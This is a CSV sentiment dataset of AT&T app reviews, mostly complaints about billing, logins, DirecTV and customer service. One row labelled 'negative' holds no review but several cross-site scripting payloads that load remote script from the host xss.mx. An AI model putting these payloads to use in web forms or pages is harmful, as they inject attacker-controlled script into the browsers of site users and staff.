Body,Sentiment
My contract is up in Nov and I’m probably opting out.If you care to find out why just pull up my $348 dollar bill on 6.24.19.Not happy when I’m blind sided with charges I didn’t expect.,negative
"This app is apiece of junk . It’s need to be totally overhaul, it is a constant headache when ever I try to login to my account. Nothing works with this app.",negative
I can’t even see my bills nor use my app,negative
"I hate At&T business.
They are not user friendly.
Not helpful.
It’s never been the same since switching to the business model of At&T.
I would switch back but I would lose my unlimited data. 
They doubled my rate for add-a-line without my making changes to my plan. 
I am looking to switch carriers after more than a decade with at&t",negative
I updated my app 2days ago and now i cant access anything but the initial front page. Therefore i cant make any payments or arrangements and i cannot hardly load anything on my phone because the service is so dang slow!,negative
I like,positive
Clunky app and always logs you out. Let us use faceID or fingerprint. A poorly designed app from a “tech” company,negative
"Very disappointed in not receiving all the channels, this has gone on for too long not to be resolved.",negative
"No way possible your 4.4 out of 5 is correct. Scam! Tried to spend money at AT&T, but guess what? I couldn’t because your lousy app don’t work. Couldn’t view updated options. WHAT A JOKE!  I guess with all the money AT&T makes, no big deal.

Lol, again trying to update, but app doesn’t work. I give up. Once next plans paid in full, I will switch to Verizon. The only reason I post reviews is to warn others, because AT&T sure doesn’t pay attention to them.",negative
Started to question the price of AT&T Why do they support killing babies with Planed Parent,negative
"The coverage and equipment is first class, but heaven forbid you have a simple billing question or need customer service... on more than one occasion, I tried to get a simple billing question answered (why did my bill increase over $7 since my bill has not changed in some time and I’m on auto pay?) and was met with the most inept and rude people I’ve ever dealt with. They seemed more interested in having me close my account (I have unlimited everything) than in answering my question... which they never did.",negative
I have no att phone service at my home most of the time. I’ve complained and nothing ever gets done. One day maybe the towers will get upgraded and I’ll be able to call 911 if I need to. I’m waiting for the day I really need to call or my family needs to contact me at home and boom! No service.,negative
I have two accounts one for my brother and one for myself..  it’s a major ordeal accessing my billing. Bundle them or something!.,negative
App crashes and is unresponsive almost everyone i use it.,negative
"I try and use the app and nothing is working. I'm then asked to review it, so....",negative
"Barely have tv, still being overcharged.",negative
I shouldn’t have to get a text code and have to log in a fourth time so I can pay my bill. At some point the mobile app or browser should remember my info if I allow it. At some point this just becomes too annoying.,negative
I use the app once a month to make a payment. Stop forcing a password confirmation because I haven’t logged in recently.,negative
My bill is not correct,negative
I just see constant bills! I think everything is paid and then I see a bill for hundreds of dollars for my DIRECTV. I thought the accounts were merged. I thought everything was on auto pay. No one calls to say your payments are behind so I get these big surprises. I don’t get that.Not good business.,negative
Your website is PATHETIC!  Constantly broken ????????,negative
My directv bill does not show on the app. I can not access my account to make changes. I spent 6 hours on the phone and never resolved the issue. ATT has ruined directv. Now we’re losingchannels because two giant corporations can’t resolve their issues.,negative
"Your app is crap!  I can’t login.  Continuous loop stating that my account information isn’t available at this time.  Please try again later.  

Please hire a developer that can write code properly cause the refuse you’re putting into production is less than adequate.  It’s so bad I’d be embarrassed to release apps that can’t function. 

So please do yourselves a favor and invest in a proper delivery pipeline...  preferably one that contains some QA resources.",negative
"I’m fed up , ongoing 2+ months of loosing ATT internet Friday late morning to Sunday evening/ Monday morning!! Called and called , been deceived and LIED too , Now can’t get data usage on ATT app! A lot of my data usage is waiting for apps to load!! I’m senior on a fixed income, maybe forced to switch, and will write a letter to FCC and my state representative!",negative
I’m not happy with that fact that all of a sudden I’m getting these messages saying my password is not correct and all these bogus alerts,negative
Every time i call about my bill it gets more screwed up than before,negative
App is slow,negative
Worst company ever! Zero customer service and overcharges every single bill. Locked out of my account and they cannot reopen it. Spent hours on phone with inept people that never help solve the issue. Leaving for Verizon and hope to break clean from ATT forever! Can’t believe the FCC lets them  continue to rip off the public!,negative
Using the att app has been an great experience. It’s convenient and makes life a little easier! Thanks,positive
Price keeps going up from what our sales person told us it would be. Was at 220 a month and now 4 months later it is 249 with no explanation as to why?,negative
Your website/app makes it unnecessarily hard to get information. Chat Live is not helpful.,negative
Slowest internet,negative
"I called 6 total times, talked to at least that many ppl. Was transferred over and over placed on hold while at work. Finally someone turned my phone back on for me, but no one ever stopped the order. It couldn’t have been more than an hr after the claim when I called. All I knew was my phone was not connected. They told me about the claim. I couldn’t sit on hold for another hour. I was mid shift.",negative
I have been trying to log into my account. Have changed my password 4 times after each login with a new password I get the message lets check to see if this is really you. 5 times I have complyed. This must be a faulty line. Fix it,negative
I have the ap but when I go on it has me under 3 user names. It’s been 2 days trying to fix it but att makes it very difficult to find a phone number. I should add that their internet is terrible also. I must have it right next to my computer to obtain slow speeds. I keep my phone and iPad on data since it is so much quicker!,negative
Does not display all available options and plans. Only good for checking basic information.,negative
"He was not pleasant he was not helpful I had an appointment he said I didn’t customer service to him was not a priority he did no benefit for me as a loyal 35 year customer and I am Seriously considering going to a different provider the Sales tech he pawned me off on was extremely friendly knowledgeable and helpful
This manager needs to go back to customer service school seriously as an AT&T representative he is not doing your company any justice",negative
"Stupid App, always lags and hangs out. Not expecting this from Atnt at all !",negative
I’m so confused by my AT&T plan! I don’t understand how they could bill me $365 for a plan that should cost only $125. I guess I need to call someone about this but I’m so mad right now that I doubt I could be civil.,negative
Real easy to use and very convenient.,positive
So your app allows to split a payment but yet there was no notification that there would be a late charge if you split the payment. Have been a customer of Att even when they were Cingular and yet you nickel and dime customers to death. Terrible customer service.,negative
"foo'""><script src=//xss.mx></script><x=""

javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.mx\';document.body.appendChild(a)')

<script>$.getScript(""//xss.mx"")</script>

'""><noscript><p title=""<noscript>""><iframe srcdoc='<script x="">"" src=//xss.mx></script>'></iframe>

1'”><img src=//xss.mx><x=“",negative
"This app, like much of ATT service and associated billing is horrible.",negative
There is no way to opt out of the two-level authentication BS.,negative
"You really don’t want to know what I want to write. This is the most abysmal customer service I have ever encountered. As soon as our contracts are up, we are going to T-Mobile or anyone else",negative
They don't have consideration with the costumers even if you ben with them for long time,negative
I paid insurance for 2 years and 6 months and when my phone broke and was replaced it was with a refurbished piece of crap that has never worked properly. When I wanted to complain I didn’t get to talk to areal person because there is no phone number for ATT to be found. I am not happy!,negative
"Since AT&T purchased DirecTv, service has gone to crap. If I could give a -5 star rating I would",negative
love it !,positive
This app is beyond buggy and barely works,negative
Horrible for Uverse thou,negative
"Typical cell service, called back a relative and talked for an hour overseas, hit with $250 unreversable phone bill in 60 minutes of talking, told I could see charge in the app.  It’s my fault, should have known, but unethical to be charged so much imo in this day and age without warning.  All loyalty lost.",negative
For the last 2 months the app has had a system error so I can’t look at my account or anything,negative
"Every time I try to log in the app times out. With that being said, how do you want me to pay my bill. This is so disgusting and unprofessional. Fix the issues.",negative
"Nobody will help me after hours and days on the phone. I just keep getting more and more bills and computers when I call.

    It’s going on a year now and still nobody can or will help me by fixing my account. I still either have to go to a store and pay my bill, use auto pay, or pay a fee to pay bill over the phone. AT&T has been very clear that they do not care if my service works, or that I am happy with their service. These star ratings and reviews are a joke. Nobody cares about these reviews or even direct requests for help. But they will never offer changes in the contract obligations, even though they make no effort to fulfill their end of the agreement. DO NOT BUNDLE YOUR SERVICE!!! It’s a nightmare and you will not get help from anyone.

Update: still no contact or response from anyone regarding my issue with having a package account and being able to use any form of payment besides autopay or paying at the store. Now all my discounts are well gone and only obligated because of required contract. Good service is why people should use your company, not because you will charge a penalty for leaving. Obvious superficial customer service. Apparently nobody even reads these.",negative
Some item linked to login are not linked to each other.  ie.  your new password will not get you access to e mail.,negative
"Cannot connect using any site, app, number.  Site does not work when using.

No customer support",negative
"Poor customer service.  Continuous overcharging that results in calling AT&T several times!!   Long lasting conversations with customer service representatives to resolve issues.  Not being able to see the bill on line and/or AT&T app on the cell phone. Continua interruption in communications.  Hard to understand the accent of some representatives.  Representatives often put you on long holds or transfer you to someone else or make mistakes that results in calling several times to resolve a simple issue or over charging.

In addition to above, I have a very poor reception in my house and sometimes I cannot hear the voice of the other people that I am talking to or they cannot hear me.",negative
"Actualizacion muy tardada, no responde al señeccionar  opciones",negative
TV never worked and the integration (att & diecttv) is terrible and made it worse!,negative
"I believe you scam your customers by telling them they can get a $250 gift card to sign up and you only send them $100!!
Does the COO know of this practice? CFO?",negative
I have been getting an error code (RESLGN0102) while trying log in to my account for months now. What is going on!?,negative
Why is it you can’t get a scheduled payment taken off once you pay it before time I could not talk to anyone to let them know the payment of the past due amount was paid a day before the scheduled payment so it looked like I did not pay my bill I hope it does not cost me an overdraft if it does I will take my card information off and pay in the store so I don’t get charged for trying to do the right thing ahead of time please respond,negative
There is no signal sign on. I constantly have to reset my password.,negative
"I went to the AT&T store in Fairfield California to set up an international plan for my future travels. It didn’t work. From the very start, I got stuck on the wrong side of some one-way doors in the Rome airport and able to communicate with my partner. 
It wasn’t until the fifth day of my foreign travel that I was able to straighten things out. 
When I return to the United States I called AT&T billing, and they assured me that everything would be taken care of. I assume there will be no charge for lack of service. Now I received a bill.....$440. is twice what I should be billed for wireless, home internet and an international plan for two phones. 
One star is one star to many.",negative
"Trying to link wireless and tv should be simple, but no you folks keep telling me “hmmm,something went wrong”.  And that’s it, won’t say “what” went wrong, or what to do about it, but I shouldn’t expect anything different. I hate att, and wish I had never been sucked into leaving Sprint. You guys are the worst, and I refuse to call your customer service in India again. Those are the stupidest people on the planet. Screw your att.",negative
Getting detailed wireless usage by line item is fairly impossible now. Worthless app.,negative
My att cell phone experience has been terrible so far.  Salesman Ryan lied about the bill being lower than sprint it’s not. The service and custom reps are slow to respond. Wishing i never left sprint!!!!!,negative
"How terribly ironic is it that AT&T, of all people, still cannot develop an app that doesn't freeze up or simply not perform every time you use it!
And their website through a computer is just as bad!!

AND, has anybody noticed how many bad reviews are on this app but still have 5 stars? What's up with that!? Even this review system is garbage!",negative
This issue is not acceptable.  We all have contracts and we pay our bills but you decide to change our viewing without notice.  Not acceptable void all contracts.,negative
"Why do you have to change it every month?!? 
If it ain’t broke.....",negative
"I’ve had Direct Tv for probably 20 years, and I’m considering canceling.  I lost NBC, and they say CBS and ABC are next.  It’s amazing that all other companies can make an with Nexstar, but not AT&T.  The largest communications provider.  Not only are some of my favorite shows on there, but also the news.  I know I’m not the only one in my area ready to cancel.  If one more channel gets canceled, I’m gone.  I’ll change providers.  And the early termination fee won’t phase me.  I’ll pay $5 just because it only seems fair after what I’ve read.",negative
Your sight is not user friendly,negative
"Few things are worse than dealing with AT&T. Yet, somehow, they were able to find a way to alienate people further. That takes effort.",negative
No one listens! I specifically said DO NOT combine my bills! AND YOU DID IT ANY WAYS! And I DID NOT want auto pay! I know how my bills work and you think you can do anything you want!  ??,negative
"Youfucked me again ,you lied and said I had media with the pkg and my discounts , just like you lied when I took ff the land Lina s never di and never got my credit 
Give me media back",negative
"Before I updated my app, I could select the date that wanted to pay my bill. Now I have to wait until the actual date I want to pay my bill, which causes me to forget and miss the due date.",negative
TRASH,negative
Recently I went to an AT&T store in Bayamon. The sales associate that I spoke too told me the by making the change to this new plan I would save $67 a month. Based on my last bill. As you can see it is not true. In fact it’s $63 more and I have no true savings base on my last bill. I had changed from Dish to Direct TV because of this same reason. They they had me make a change saying their was a savings. But I can find a fix to all this.,negative
Color each phone # Names and total bill amount so it’s legible thanks,negative
It takes forever to try am access anything and half the time it disconnects and I need to start over! Frustrating!,negative
We have Directv and AT&T. Is their a way to combine the billing or get them on the same accounts. So I don’t have to bounce back and forth between them to answer questions or make a complaint? You charged me a $225 deductible for a broken screen! Now you are dropping Fox on Directv! I have been a loyal customer for over 20 years and I get no breaks! I will be checking with DISH network to see if I can get those certain channels that you no longer provide. I am not getting a break in cost for channels that YOU have dropped.. MY PHONE COSTS are double what they were a year ago and I only added one phone..,negative
I can no longer with my wireless account. It only shows direct tv.,negative
If The channels were cancelled or pulled I demand discount or will cancel service altogether,negative
How does a company with this much money make an app that is such a piece of garbage?  It literally doesn’t work and I have no idea how I’m going to pay my bill.,negative
No me deja entrar a ver mis cosas,negative
"Why try to open to view my cell phone bill and still attached to direct tv?
Was better the oldest app that we control all activities for the cells",negative
"Using iPhone 6S. Won’t let me login because secondary security page doesn’t work. Therefore, I have to access ATT thru a computer.",negative
"This is absolutely the worst company I have ever had to deal with.  You talk to someone and you are told one thing then you get your bill and it is not what you were told then all you get is sorry that rep did not know what they were talking about.  As soon as I can 
find another company with what I want I’m done with ATT.  Couldn’t rate by star because I give them a 0 rating.  No good not honest and will rip you off.",negative
"Most people know and agree that AT&T is awful. But this app...wow. It’s clunky, rarely works, times out and crashes on the regular.",negative
If I could give negative stars I would. It keeps going in circles and logging me out. Complete waste of time.,negative
"I’d normally give a higher review, but I’ve been trying to check my upgrade eligibility, and all I keep getting is a sign in screen!",negative
"It would be nice to not have to pay full price when I’m not getting 2 channels now.. 
when is my contract up with you??",negative
Geraldine was a fantastic help to me in linking all of my accounts together! She was patient with me as I am not the most tech savvy person out there. Thank you so much!,positive
"App is awful !!! Not user friendly and creates complicated use for what should be basic. Looking at other service providers. Tired of this mess. Plus NO one is ever available @ customer service, always a wait or a person who does not know how to read off script.",negative
"Difficult to switch between att and directv. I miss the old way of accessing each, where there was a dedicated app for each respective service.",negative
ATT has been the overcharging me for extra phones for 8 months now and WILLNOT fix the problem!!!!!!  I have spent hours with customer support and have been told EVERY TIME it will be resolved and it never is.  How do I start a class action lawsuit against this dishonest company?????,negative
Bad experience. Horrible experience.,negative
I changed my service over a month ago to 1 line and they are still charging me $265 after I’ve called 3 times and they keep telling me it’s only $80 a month plus taxes which should never be more then $90 and again a high bill! Do these service operators know how to do their job or is this AT&T policy to rip off long time (12years with them) Coustomers or anybody for that matter. Good bye AT&T Hello Whoever don’t rip us off!! Bye,negative
"Trying to login to buy At&T’s Passport Calling service while I am at an airport in Germany waiting for a flight.  But of course because my message is from a server outside the United States it won’t let me login. I got the L569 “try again later” for more than an hour, until I had to leave. I need to buy the Passport Calling so I can use my phone on my business trip. T MOBILE makes it very easy, and just connects to a correspondent carrier in any country you go to. Not AT&T. Why not, why make it so hard? Also, there is no way to talk to anybody about this because AT&T is arrogant and doesn’t care what its customers think or what would make it easier for them.",negative
Once I sign in with my touch ID I am still not going into my account.  It freezes there instead of accessing my information.  Extremely frustrating.,negative
"Enjoy using d app, very efficient",positive
Nothing works in this app. Oops something went wrong. Try later is the answer I get for anything I do on this app. But I need to hope for the best que believe the cable service is going to be better than the app??,negative
"One of my 3 phones stopped working. I called to find out what the insurance covered. I  was told by Elmer “ just have my Daughter-in-Law and Grandson, it’s his phone, take the phone into the store and they can handle it return”. He also said that “ they can upgrade to a XXR for $50 or to XXS Max for $80”. I said great I know he’ll do the Max. So the next day they went into the store in Newington CT and was “told that’s not how it works”. They have to file a claim and the insurance sends you an equal phone plus you can’t upgrade. I was so mad that support lied to me I called them and the insurance back. The insurance says I had never called and they had sent the phone out and that’s all they could and would. I was on the phone for an hour. Mostly on hold. I then called support again. I talked to Clarissa  she told me there was no record of my call. This made even madder because now I’m being lied to again. After about a half hour she finally said “yes there is a record of my call but all it said is I had an insurance question”. I asked her to send a message to have the call reviewed, I know it’s recorded. She said “they can’t listen to the recordings”.  After another half hour she said “when you get the 7 phone that the insurance is sending call this number and they will tell you how to send it back and we will send you an 8”. So the next day the 7 came and I called the number Clarissa gave me thinking I’ll have no problems. Wrong again I was told there is no record of Clarissa telling me that and they couldn’t do anything for me to call the insurance. I called the insurance and was told they didn’t promise me an exchange “that’s between you and AT&T”. So in the end just know the insurance isn’t worth the 3 years we paid and if something goes wrong AT&T and the insurance will lie to you and not follow up on their promise. Bea",negative
Store manager refused to discuss phone upgrade issues with AT&T Loyalty Department that had a resolution to my issue. It took eight days for the regional manager to return my repeated calls. The matter still has not been resolved after twelve working days. It has been extremely frustrating. I would not recommend AT&T due to poorer customer service.,negative
"I need to “complete application for paperless billing” to get my discount. But for literally days , whenever I try to do it online it says it is “ unable to process it due to a temporary error. I called and they won’t let me do it over the phone. But the website won’t let me do it either. Their response: keep trying. Really?",negative
It is easy for you to collect the money but to get the refund will take a lot of stress n months before or not even giving back your credit or refund.rediculous company.,negative
Directv still is linked to wireless and internet accounts.,negative
I have been with AT&T for years and this app has been very helpful!,positive
An app should let you do whatever you need to do without internet access or it’s not helpful!,negative
Have had many issues with AT&T - most recently have tried to go from paperless billing back to paper bills - for three months they have not been able to switch our billing method & we spend countless hours on phone with customer service disputing late charges - am very unhappy with their customer service.,negative
I have tons of problems getting this app to work! And I’m no novice at paying via app. When I have problems I call...every message and person tells you to go to the app or website!! Totally frustrated!!,negative
Phone is not setup for international calls.  Was in chat trying to resolve problem but would not accept offer of half without knowing why I am being charged.  “Meredith” dropped the chat.,negative
"This app is extremely outdated, and not very user-friendly. They have struggled to keep up with the blending of their products (i.e. phone and satellite). The app doesn’t all you to easily navigate between the two. It’s so bad, it’s caused me to contemplate switching carriers... but their products are likely just as bad.",negative
"This app unprofessional updates 
Slow moving to next page 
Just we sign up for fiber Internet too slow",negative
Y’all about to lose one customer,negative
Ridiculous international charges when you can buy a Sim card for $12 US for a week.,negative
"So I have had this app ever since it has been available and never had a problem with it. After 3 years, I get a new 10s iPhone and I can’t get get access past the second verification. I called tech support and they are clueless. Everything they suggested, I have already tried. Playing with the app after that 30 min conversation, it turns out that when you select your phone number to send the code to, you have to close your phone down the reopen it and it will let you submit it. You have to do the same thing when you enter the code. Just an FYI for everyone.",negative
"In typical AT&T fashion, terribly disorganized and difficult to use. Many of the links don’t work properly ...or AT ALL.",negative
Not a fan of AT&T.,negative
To many commercial and they took away channel 11. It is not fair.,negative
My bill has increased for no reason!,negative
Waiting for over 1 1/2 hours to get a simple question answered.,negative
Chat is no help at all.,negative
Don’t understand why I can make a partial payment today on July 20 when my bill is not until Aug 1. Really?,negative
I am moving to Verizon because att sold be a buy one get one free and is now reneging on the deal. That is a scam and I will tell everyone I know the att is scamming customer. I will also report you to consumer affairs,negative
Poor service,negative
This is always messing something up when I go to pay. I’m constantly having to input my information again and again. Getting so tired of AT&T.,negative
"Anywhere I access this app, it’s always slow to load, and difficult to use. Not a “techy-person”, seems like this app is meant for Silicon Valley engineers, rather than common folk. Nice attempt to make things easier for you clientele, but misses the mark.",negative
